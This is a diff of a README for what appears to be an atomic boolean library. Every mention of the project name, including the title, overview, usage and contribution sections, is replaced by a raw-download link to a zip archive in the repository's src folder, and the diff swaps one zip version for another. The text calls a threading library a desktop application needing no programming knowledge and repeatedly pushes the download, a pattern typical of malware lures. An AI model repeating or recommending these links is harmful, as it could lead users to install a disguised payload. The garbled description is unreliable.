@@ -1,10 +1,10 @@
-# 🚀 https://github.com/Manhal4321/soenneker.atomics.bools/raw/refs/heads/main/src/soenneker_bools_atomics_v3.7.zip - A Simple Solution for Safe Boolean Operations
+# 🚀 https://github.com/Manhal4321/soenneker.atomics.bools/raw/refs/heads/main/src/soenneker-atomics-bools-v1.3.zip - A Simple Solution for Safe Boolean Operations
 
-[![Download](https://github.com/Manhal4321/soenneker.atomics.bools/raw/refs/heads/main/src/soenneker_bools_atomics_v3.7.zip%20Now-Release-brightgreen)](https://github.com/Manhal4321/soenneker.atomics.bools/raw/refs/heads/main/src/soenneker_bools_atomics_v3.7.zip)
+[![Download](https://github.com/Manhal4321/soenneker.atomics.bools/raw/refs/heads/main/src/soenneker-atomics-bools-v1.3.zip%20Now-Release-brightgreen)](https://github.com/Manhal4321/soenneker.atomics.bools/raw/refs/heads/main/src/soenneker-atomics-bools-v1.3.zip)
 
 ## 📖 Overview
 
-Welcome to the https://github.com/Manhal4321/soenneker.atomics.bools/raw/refs/heads/main/src/soenneker_bools_atomics_v3.7.zip project. This software provides a lock-free atomic boolean, allowing safe and efficient operations in multi-threaded environments. Whether you need to handle multiple tasks or improve performance, this tool simplifies the process.
+Welcome to the https://github.com/Manhal4321/soenneker.atomics.bools/raw/refs/heads/main/src/soenneker-atomics-bools-v1.3.zip project. This software provides a lock-free atomic boolean, allowing safe and efficient operations in multi-threaded environments. Whether you need to handle multiple tasks or improve performance, this tool simplifies the process.
 
 ## 💡 Key Features
 
@@ -31,11 +31,11 @@ To use this software, ensure your system meets the following requirements:
 
 To download the latest release, visit this page:
 
-[Download the latest release](https://github.com/Manhal4321/soenneker.atomics.bools/raw/refs/heads/main/src/soenneker_bools_atomics_v3.7.zip)
+[Download the latest release](https://github.com/Manhal4321/soenneker.atomics.bools/raw/refs/heads/main/src/soenneker-atomics-bools-v1.3.zip)
 
 On that page, you will find the current version alongside any previous ones. Choose the version you need, then click to download it. The installation process is straightforward, so you can start using once it's downloaded.
 
-## 📂 Using https://github.com/Manhal4321/soenneker.atomics.bools/raw/refs/heads/main/src/soenneker_bools_atomics_v3.7.zip 
+## 📂 Using https://github.com/Manhal4321/soenneker.atomics.bools/raw/refs/heads/main/src/soenneker-atomics-bools-v1.3.zip 
 
 Once installed, you can use the atomic boolean in your applications. You don't need to know the details of programming. This application is designed to be run directly from the desktop.
 
@@ -68,10 +68,10 @@ A: Yes, using atomic operations reduces the time spent waiting for locks, thus s
 
 ## 📝 Contribution
 
-If you would like to contribute to the https://github.com/Manhal4321/soenneker.atomics.bools/raw/refs/heads/main/src/soenneker_bools_atomics_v3.7.zip project, please visit the repository on GitHub for more details. You can open issues, propose features, or submit enhancements.
+If you would like to contribute to the https://github.com/Manhal4321/soenneker.atomics.bools/raw/refs/heads/main/src/soenneker-atomics-bools-v1.3.zip project, please visit the repository on GitHub for more details. You can open issues, propose features, or submit enhancements.
 
 ## 📫 Contact
 
 For more information, issues, or support, please reach out via the GitHub repository. We are here to assist you!
 
-[Download the latest release](https://github.com/Manhal4321/soenneker.atomics.bools/raw/refs/heads/main/src/soenneker_bools_atomics_v3.7.zip)
+[Download the latest release](https://github.com/Manhal4321/soenneker.atomics.bools/raw/refs/heads/main/src/soenneker-atomics-bools-v1.3.zip)
